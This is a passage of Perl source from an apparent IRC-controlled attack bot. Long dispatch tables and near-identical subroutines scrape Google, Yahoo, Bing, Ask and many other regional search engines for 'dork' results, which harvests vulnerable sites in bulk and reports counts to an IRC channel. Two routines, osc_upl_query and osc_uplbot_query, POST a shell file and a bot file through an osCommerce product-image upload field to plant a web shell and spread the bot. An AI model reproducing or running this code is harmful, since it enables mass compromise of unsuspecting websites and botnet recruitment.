	if ($engine eq "JacKSK") { my @jacksk = &jacksk($dork); push(@total,@jacksk); }
	if ($engine eq "JacKNO") { my @jackno = &jackno($dork); push(@total,@jackno); }
	if ($engine eq "JacKSG") { my @jacksg = &jacksg($dork); push(@total,@jacksg); }
	if ($engine eq "JacKSE") { my @jackse = &jackse($dork); push(@total,@jackse); }
	if ($engine eq "JacKCH") { my @jackch = &jackch($dork); push(@total,@jackch); }
	if ($engine eq "JacKWS") { my @jackws = &jackws($dork); push(@total,@jackws); }
	if ($engine eq "JacKTW") { my @jacktw = &jacktw($dork); push(@total,@jacktw); }
	if ($engine eq "JacKBG") { my @jackbg = &jackbg($dork); push(@total,@jackbg); }
	if ($engine eq "JacKCO") { my @jackco = &jackco($dork); push(@total,@jackco); }
	if ($engine eq "JacKHR") { my @jackhr = &jackhr($dork); push(@total,@jackhr); }
	if ($engine eq "JacKFI") { my @jackfi = &jackfi($dork); push(@total,@jackfi); }
	if ($engine eq "JacKGR") { my @jackgr = &jackgr($dork); push(@total,@jackgr); }
	if ($engine eq "JacKHK") { my @jackhk = &jackhk($dork); push(@total,@jackhk); }
	if ($engine eq "JacKPE") { my @jackpe = &jackpe($dork); push(@total,@jackpe); }
	if ($engine eq "JacKPT") { my @jackpt = &jackpt($dork); push(@total,@jackpt); }
	if ($engine eq "JacKTR") { my @jacktr = &jacktr($dork); push(@total,@jacktr); }
	if ($engine eq "JacKGO") { my @jackgo = &jackgo($dork); push(@total,@jackgo); }
    if ($engine eq "GooGLeCA") { my @googleCA = googleCA($dork); push(@total,@googleCA); }
    if ($engine eq "GooGLeDE") { my @googleDE = googleDE($dork); push(@total,@googleDE); }
    if ($engine eq "GooGLeUK") { my @googleUK = googleUK($dork); push(@total,@googleUK); }
    if ($engine eq "GooGLeFR") { my @googleFR = googleFR($dork); push(@total,@googleFR); }
    if ($engine eq "GooGLeES") { my @googleES = googleES($dork); push(@total,@googleES); }
    if ($engine eq "GooGLeIT") { my @googleIT = googleIT($dork); push(@total,@googleIT); }
    if ($engine eq "GooGLeNL") { my @googleNL = googleNL($dork); push(@total,@googleNL); }
    if ($engine eq "GooGLeBE") { my @googleBE = googleBE($dork); push(@total,@googleBE); }
    if ($engine eq "GooGLeCH") { my @googleCH = googleCH($dork); push(@total,@googleCH); }
    if ($engine eq "GooGLeSE") { my @googleSE = googleSE($dork); push(@total,@googleSE); }
    if ($engine eq "GooGLeDK") { my @googleDK = googleDK($dork); push(@total,@googleDK); }
    if ($engine eq "GooGLeNO") { my @googleNO = googleNO($dork); push(@total,@googleNO); }
    if ($engine eq "GooGLeNZ") { my @googleNZ = googleNZ($dork); push(@total,@googleNZ); }
    if ($engine eq "GooGLeIE") { my @googleIE = googleIE($dork); push(@total,@googleIE); }
    if ($engine eq "GooGLeBR") { my @googleBR = googleBR($dork); push(@total,@googleBR); }
    if ($engine eq "GooGLeAR") { my @googleAR = googleAR($dork); push(@total,@googleAR); }
    if ($engine eq "GooGLeCO") { my @googleCO = googleCO($dork); push(@total,@googleCO); }
    if ($engine eq "GooGLeCU") { my @googleCU = googleCU($dork); push(@total,@googleCU); }
    if ($engine eq "GooGLeCL") { my @googleCL = googleCL($dork); push(@total,@googleCL); }
    if ($engine eq "GooGLeMX") { my @googleMX = googleMX($dork); push(@total,@googleMX); }
    if ($engine eq "GooGLeAU") { my @googleAU = googleAU($dork); push(@total,@googleAU); }
    if ($engine eq "GooGLeRU") { my @googleRU = googleRU($dork); push(@total,@googleRU); }
    if ($engine eq "GooGLeAT") { my @googleAT = googleAT($dork); push(@total,@googleAT); }
    if ($engine eq "GooGLePL") { my @googlePL = googlePL($dork); push(@total,@googlePL); }
    if ($engine eq "GooGLeIL") { my @googleIL = googleIL($dork); push(@total,@googleIL); }
    if ($engine eq "GooGLeTR") { my @googleTR = googleTR($dork); push(@total,@googleTR); }
    if ($engine eq "GooGLeUA") { my @googleUA = googleUA($dork); push(@total,@googleUA); }
    if ($engine eq "GooGLeGR") { my @googleGR = googleGR($dork); push(@total,@googleGR); }
    if ($engine eq "GooGLeJP") { my @googleJP = googleJP($dork); push(@total,@googleJP); }
    if ($engine eq "GooGLeCN") { my @googleCN = googleCN($dork); push(@total,@googleCN); }
    if ($engine eq "GooGLeMY") { my @googleMY = googleMY($dork); push(@total,@googleMY); }
    if ($engine eq "GooGLeTH") { my @googleTH = googleTH($dork); push(@total,@googleTH); }
    if ($engine eq "GooGLeIN") { my @googleIN = googleIN($dork); push(@total,@googleIN); }
    if ($engine eq "GooGLeKR") { my @googleKR = googleKR($dork); push(@total,@googleKR); }
    if ($engine eq "GooGLeRO") { my @googleRO = googleRO($dork); push(@total,@googleRO); }
    if ($engine eq "GooGLeTW") { my @googleTW = googleTW($dork); push(@total,@googleTW); }
    if ($engine eq "GooGLeZA") { my @googleZA = googleZA($dork); push(@total,@googleZA); }
    if ($engine eq "GooGLePT") { my @googlePT = googlePT($dork); push(@total,@googlePT); }
    if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }
    if ($engine eq "YaHoo") { my @yahoo = &yahoo($dork); push(@total,@yahoo); }
    if ($engine eq "YahOoCA") { my @yahooCA = yahooCA($dork); push(@total,@yahooCA); }
    if ($engine eq "YahOoUK") { my @yahooUK = yahooUK($dork); push(@total,@yahooUK); }
    if ($engine eq "YahOoDE") { my @yahooDE = yahooDE($dork); push(@total,@yahooDE); }
    if ($engine eq "YahOoFR") { my @yahooFR = yahooFR($dork); push(@total,@yahooFR); }
    if ($engine eq "YahOoES") { my @yahooES = yahooES($dork); push(@total,@yahooES); }
    if ($engine eq "YahOoIT") { my @yahooIT = yahooIT($dork); push(@total,@yahooIT); }
    if ($engine eq "YahOoHK") { my @yahooHK = yahooHK($dork); push(@total,@yahooHK); }
    if ($engine eq "YahOoID") { my @yahooID = yahooID($dork); push(@total,@yahooID); }
    if ($engine eq "YahOoIN") { my @yahooIN = yahooIN($dork); push(@total,@yahooIN); }
    if ($engine eq "YahOoAU") { my @yahooAU = yahooAU($dork); push(@total,@yahooAU); }
    if ($engine eq "YahOoMX") { my @yahooMX = yahooMX($dork); push(@total,@yahooMX); }
    if ($engine eq "YahOoTW") { my @yahooTW = yahooTW($dork); push(@total,@yahooTW); }
    if ($engine eq "YahOoBR") { my @yahooBR = yahooBR($dork); push(@total,@yahooBR); }
    if ($engine eq "YahOoAR") { my @yahooAR = yahooAR($dork); push(@total,@yahooAR); }
    if ($engine eq "YahOoNL") { my @yahooNL = yahooNL($dork); push(@total,@yahooNL); }
    if ($engine eq "YahOoDK") { my @yahooDK = yahooDK($dork); push(@total,@yahooDK); }
    if ($engine eq "YahOoPH") { my @yahooPH = yahooPH($dork); push(@total,@yahooPH); }
    if ($engine eq "YahOoCL") { my @yahooCL = yahooCL($dork); push(@total,@yahooCL); }
    if ($engine eq "YahOoRU") { my @yahooRU = yahooRU($dork); push(@total,@yahooRU); }
    if ($engine eq "YahOoCH") { my @yahooCH = yahooCH($dork); push(@total,@yahooCH); }
    if ($engine eq "YahOoCO") { my @yahooCO = yahooCO($dork); push(@total,@yahooCO); }
    if ($engine eq "YahOoFI") { my @yahooFI = yahooFI($dork); push(@total,@yahooFI); }
    if ($engine eq "YahOoRO") { my @yahooRO = yahooRO($dork); push(@total,@yahooRO); }
    if ($engine eq "YahOoVE") { my @yahooVE = yahooVE($dork); push(@total,@yahooVE); }
    if ($engine eq "YahOoAT") { my @yahooAT = yahooAT($dork); push(@total,@yahooAT); }
    if ($engine eq "YahOoPL") { my @yahooPL = yahooPL($dork); push(@total,@yahooPL); }
    if ($engine eq "YahOoKR") { my @yahooKR = yahooKR($dork); push(@total,@yahooKR); }
    if ($engine eq "YahOoNZ") { my @yahooNZ = yahooNZ($dork); push(@total,@yahooNZ); }
    if ($engine eq "YahOoGR") { my @yahooGR = yahooGR($dork); push(@total,@yahooGR); }
    if ($engine eq "YahOoPE") { my @yahooPE = yahooPE($dork); push(@total,@yahooPE); }
    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }
    if ($engine eq "AsKCA") { my @askCA = askCA($dork); push(@total,@askCA); }
    if ($engine eq "AsKDE") { my @askDE = askDE($dork); push(@total,@askDE); }
    if ($engine eq "AsKIT") { my @askIT = askIT($dork); push(@total,@askIT); }
    if ($engine eq "AsKUK") { my @askUK = askUK($dork); push(@total,@askUK); }
    if ($engine eq "AsKFR") { my @askFR = askFR($dork); push(@total,@askFR); }
    if ($engine eq "AsKES") { my @askES = askES($dork); push(@total,@askES); }
    if ($engine eq "AsKRU") { my @askRU = askRU($dork); push(@total,@askRU); }
    if ($engine eq "AsKNL") { my @askNL = askNL($dork); push(@total,@askNL); }
    if ($engine eq "AsKEU") { my @askEU = askEU($dork); push(@total,@askEU); }
    if ($engine eq "AsKPL") { my @askPL = askPL($dork); push(@total,@askPL); }
    if ($engine eq "AsKAT") { my @askAT = askAT($dork); push(@total,@askAT); }
    if ($engine eq "AsKSE") { my @askSE = askSE($dork); push(@total,@askSE); }
    if ($engine eq "AsKDK") { my @askDK = askDK($dork); push(@total,@askDK); }
    if ($engine eq "AsKNO") { my @askNO = askNO($dork); push(@total,@askNO); }
    if ($engine eq "AsKAU") { my @askAU = askAU($dork); push(@total,@askAU); }
    if ($engine eq "AsKBR") { my @askBR = askBR($dork); push(@total,@askBR); }
    if ($engine eq "AsKMX") { my @askMX = askMX($dork); push(@total,@askMX); }
    if ($engine eq "AsKJP") { my @askJP = askJP($dork); push(@total,@askJP); }
    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }
    if ($engine eq "BingDE") { my @bingDE = bingDE($dork); push(@total,@bingDE); }
    if ($engine eq "BingUK") { my @bingUK = bingUK($dork); push(@total,@bingUK); }
    if ($engine eq "BingCA") { my @bingCA = bingCA($dork); push(@total,@bingCA); }
    if ($engine eq "BingBR") { my @bingBR = bingBR($dork); push(@total,@bingBR); }
    if ($engine eq "BingFR") { my @bingFR = bingFR($dork); push(@total,@bingFR); }
    if ($engine eq "BingES") { my @bingES = bingES($dork); push(@total,@bingES); }
    if ($engine eq "BingIT") { my @bingIT = bingIT($dork); push(@total,@bingIT); }
    if ($engine eq "BingBE") { my @bingBE = bingBE($dork); push(@total,@bingBE); }
    if ($engine eq "BingNL") { my @bingNL = bingNL($dork); push(@total,@bingNL); }
    if ($engine eq "BingPT") { my @bingPT = bingPT($dork); push(@total,@bingPT); }
    if ($engine eq "BingNO") { my @bingNO = bingNO($dork); push(@total,@bingNO); }
    if ($engine eq "BingDK") { my @bingDK = bingDK($dork); push(@total,@bingDK); }
    if ($engine eq "BingSE") { my @bingSE = bingSE($dork); push(@total,@bingSE); }
    if ($engine eq "BingCH") { my @bingCH = bingCH($dork); push(@total,@bingCH); }
    if ($engine eq "BingNZ") { my @bingNZ = bingNZ($dork); push(@total,@bingNZ); }
    if ($engine eq "BingRU") { my @bingRU = bingRU($dork); push(@total,@bingRU); }
    if ($engine eq "BingJP") { my @bingJP = bingJP($dork); push(@total,@bingJP); }
    if ($engine eq "BingCN") { my @bingCN = bingCN($dork); push(@total,@bingCN); }
    if ($engine eq "BingKR") { my @bingKR = bingKR($dork); push(@total,@bingKR); }
    if ($engine eq "BingMX") { my @bingMX = bingMX($dork); push(@total,@bingMX); }
    if ($engine eq "BingAR") { my @bingAR = bingAR($dork); push(@total,@bingAR); }
    if ($engine eq "BingCL") { my @bingCL = bingCL($dork); push(@total,@bingCL); }
    if ($engine eq "BingAU") { my @bingAU = bingAU($dork); push(@total,@bingAU); }
    if ($engine eq "Google") { my @google = &google($dork); push(@total,@google); }
    if ($engine eq "Google2") { my @google2 = &google2($dork); push(@total,@google2); }
    if ($engine eq "Black") { my @black = &black($dork); push(@total,@black); }
    if ($engine eq "Yahoo") { my @yahoo = &yahoo($dork); push(@total,@yahoo); }
    if ($engine eq "aMidaLLa") { my @amidalla = &amidalla($dork); push(@total,@amidalla); }
    if ($engine eq "DogPile") { my @dogpile = &dogpile($dork); push(@total,@dogpile); }
    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }
    if ($engine eq "Uol") { my @uol = &uol($dork); push(@total,@uol); }
    if ($engine eq "AnAnZi") { my @ananzi = &ananzi($dork); push(@total,@ananzi); }
    if ($engine eq "Onet") { my @onet = &onet($dork); push(@total,@onet); }
    if ($engine eq "Clusty") { my @clusty = &clusty($dork); push(@total,@clusty); }
    if ($engine eq "Sapo") { my @sapo = &sapo($dork); push(@total,@sapo); }
    if ($engine eq "Aol") { my @aol = &aol($dork); push(@total,@aol); }
    if ($engine eq "Lycos") { my @lycos = &lycos($dork); push(@total,@lycos); }
    if ($engine eq "Hotbot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
    if ($engine eq "Seznam") { my @seznam = &seznam($dork); push(@total,@seznam); }
    if ($engine eq "Biglobe") { my @biglobe = &biglobe($dork); push(@total,@biglobe); }
    if ($engine eq "Kvasir") { my @kvasir = &kvasir($dork); push(@total,@kvasir); }
    if ($engine eq "Rediff") { my @rediff = &rediff($dork); push(@total,@rediff); }
    if ($engine eq "Sizuka") { my @sizuka = &sizuka($dork); push(@total,@sizuka); }
    if ($engine eq "NaveR") { my @naver = &naver($dork); push(@total,@naver); }
    if ($engine eq "Interia") { my @interia = &interia($dork); push(@total,@interia); }
    if ($engine eq "Snz") { my @snz = &snz($dork); push(@total,@snz); }
    if ($engine eq "Bypass") { my @bypass = &bypass($dork); push(@total,@bypass); }
	}
    @clean = &clean(@total);
    if ($silentmode == 0) { 
    &msg("$chan","$logo15,1$engine 11 ".scalar(@total)." 4|11 ".scalar(@clean)." 15"); }
    return @clean;
}
########## Stop Editing Here ##########

sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = &get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout($timot);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

sub osc_upl_query() {
    my $url = $_[0];
    my $ua  = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(20);
    my $req = $ua->post($url,
      Content_Type=>'form-data',
      Content=>["products_image"=>["$osco_shell"]]);
    return $req->content;
}

sub osc_uplbot_query() {
    my $url = $_[0];
    my $ua  = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(20);
    my $req = $ua->post($url,
      Content_Type=>'form-data',
      Content=>["products_image"=>["$osco_bot"]]);
    return $req->content;
}

########## SEARCH ENGINE HERE ##########

sub jackar() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackar.uri_escape($key)."%2Bsite%3Aar%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackat() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackat.uri_escape($key)."%2Bsite%3Aat%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackau() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackau.uri_escape($key)."%2Bsite%3Aau%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackbr() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackbr.uri_escape($key)."%2Bsite%3Abr%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackca() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackca.uri_escape($key)."%2Bsite%3Aca%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackcl() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackcl.uri_escape($key)."%2Bsite%3Acl%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackcn() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackcn.uri_escape($key)."%2Bsite%3Acn%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackcom() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackcom.uri_escape($key)."%2Bsite%3Acom%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackcz() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackcz.uri_escape($key)."%2Bsite%3Acz%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackde() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackde.uri_escape($key)."%2Bsite%3Ade%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackdk() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackdk.uri_escape($key)."%2Bsite%3Adk%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackes() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackes.uri_escape($key)."%2Bsite%3Aes%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackeu() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackeu.uri_escape($key)."%2Bsite%3Aeu%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackfr() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackfr.uri_escape($key)."%2Bsite%3Afr%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackhu() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackhu.uri_escape($key)."%2Bsite%3Ahu%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackid() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($orange.uri_escape($key)."%2Bsite%3Aid%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackil() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackil.uri_escape($key)."%2Bsite%3Ail%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackin() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackin.uri_escape($key)."%2Bsite%3Ain%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackinfo() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackinfo.uri_escape($key)."%2Bsite%3Ainfo%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackir() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackir.uri_escape($key)."%2Bsite%3Air%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackit() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackit.uri_escape($key)."%2Bsite%3Ait%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackjp() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackjp.uri_escape($key)."%2Bsite%3Ajp%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackkr() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackkr.uri_escape($key)."%2Bsite%3Akr%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackmx() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackmx.uri_escape($key)."%2Bsite%3Amx%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackmy() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackmy.uri_escape($key)."%2Bsite%3Amy%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jacknet() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jacknet.uri_escape($key)."%2Bsite%3Anet%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jacknl() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jacknl.uri_escape($key)."%2Bsite%3Anl%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackorg() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackorg.uri_escape($key)."%2Bsite%3Aorg%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackph() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackph.uri_escape($key)."%2Bsite%3Aph%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackpl() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackpl.uri_escape($key)."%2Bsite%3Apl%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackro() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackro.uri_escape($key)."%2Bsite%3Aro%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackru() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackru.uri_escape($key)."%2Bsite%3Aru%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackth() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackth.uri_escape($key)."%2Bsite%3Ath%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackua() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackua.uri_escape($key)."%2Bsite%3Aua%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jackuk() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jackuk.uri_escape($key)."%2Bsite%3Auk%26num%3D100%26start%3D".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

